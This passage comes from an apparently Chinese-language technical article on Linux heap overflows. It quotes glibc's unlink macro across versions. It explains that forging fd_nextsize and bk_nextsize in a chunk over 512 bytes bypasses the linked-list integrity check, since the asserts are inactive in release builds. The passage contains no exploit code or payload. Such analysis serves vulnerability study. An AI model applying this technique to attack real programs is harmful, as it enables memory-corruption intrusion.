&nbsp;&nbsp;BK&nbsp;=&nbsp;P-&gt;bk;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;FD&nbsp;=&nbsp;P-&gt;fd;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;FD-&gt;bk&nbsp;=&nbsp;BK;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;BK-&gt;fd&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，最老版本的glibc中对chunk header的控制并不好，导致那个时候是最好利用的，这里对chunk header的结构我就不再多做描述，几乎所有关于linux下的堆溢出文章中都会提到，那么这里，如果我们设置unlink块的对象中的bk和fd为某些特殊的值，在这个条件下很容易就能达到利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来来看一下glibc 2.15版本中，关于unlink宏的定义。malloc.c第1544行。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
#define&nbsp;unlink(P,&nbsp;BK,&nbsp;FD)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;FD&nbsp;=&nbsp;P-&gt;fd;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;BK&nbsp;=&nbsp;P-&gt;bk;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;if&nbsp;(__builtin_expect&nbsp;(FD-&gt;bk&nbsp;!=&nbsp;P&nbsp;||&nbsp;BK-&gt;fd&nbsp;!=&nbsp;P,&nbsp;0))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;malloc_printerr&nbsp;(check_action,&nbsp;&quot;corrupted&nbsp;double-linked&nbsp;list&quot;,&nbsp;P);&nbsp;\
&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;bk&nbsp;=&nbsp;BK;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;BK-&gt;fd&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!in_smallbin_range&nbsp;(P-&gt;size)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;&amp;&nbsp;__builtin_expect&nbsp;(P-&gt;fd_nextsize&nbsp;!=&nbsp;NULL,&nbsp;0))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;(P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;==&nbsp;P);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;(P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;==&nbsp;P);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(FD-&gt;fd_nextsize&nbsp;==&nbsp;NULL)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(P-&gt;fd_nextsize&nbsp;==&nbsp;P)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;fd_nextsize&nbsp;=&nbsp;FD-&gt;bk_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;fd_nextsize&nbsp;=&nbsp;P-&gt;fd_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;bk_nextsize&nbsp;=&nbsp;P-&gt;bk_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;=&nbsp;FD;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;fd_nextsize-&gt;bk_nextsize&nbsp;=&nbsp;P-&gt;bk_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P-&gt;bk_nextsize-&gt;fd_nextsize&nbsp;=&nbsp;P-&gt;fd_nextsize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
}
```</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，这里对FD-&gt;bk和BK-&gt;fd做了严格的判断，如果下一块的fd和前一块的bk不等于当前块，则会打印错误信息。只有当判断条件通过的情况下，才会执行else语句内的后续赋值内容。那么，是不是这样条件下就无法利用了呢？我们可以关注到，在else语句中还有一个嵌套的if语句，其中会执行一个函数in_smallbin_range，传参为当前块的大小，当当前块大小大于512字节的时候，程序会进入if语句中的内容，其中涉及到两个非常关键的指针指向变量fd_nextsize和bk_nextsize，而这个if语句中的else内，会执行一个赋值操作，对这两个变量，没有进行检查，于是在这种情况下，我们需要构造一个大于512字节的块，伪造fd_nextsize和bk_nextsize来完成利用。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这个漏洞的利用环境下就是利用的这个unlink宏，那么我们注意到在判断完FD-&gt;bk后的入口点，有两个assert断言，实际上在release版本下，这两个断言并不能触发。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">接下来我们来看较新的glibc 2.21，在这个版本下，malloc.c第1411行</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">```
#define&nbsp;unlink(P,&nbsp;BK,&nbsp;FD)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;FD&nbsp;=&nbsp;P-&gt;fd;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;BK&nbsp;=&nbsp;P-&gt;bk;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(__builtin_expect&nbsp;(FD-&gt;bk&nbsp;!=&nbsp;P&nbsp;||&nbsp;BK-&gt;fd&nbsp;!=&nbsp;P,&nbsp;0))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc_printerr&nbsp;(check_action,&nbsp;&quot;corrupted&nbsp;double-linked&nbsp;list&quot;,&nbsp;P);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FD-&gt;bk&nbsp;=&nbsp;BK;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\
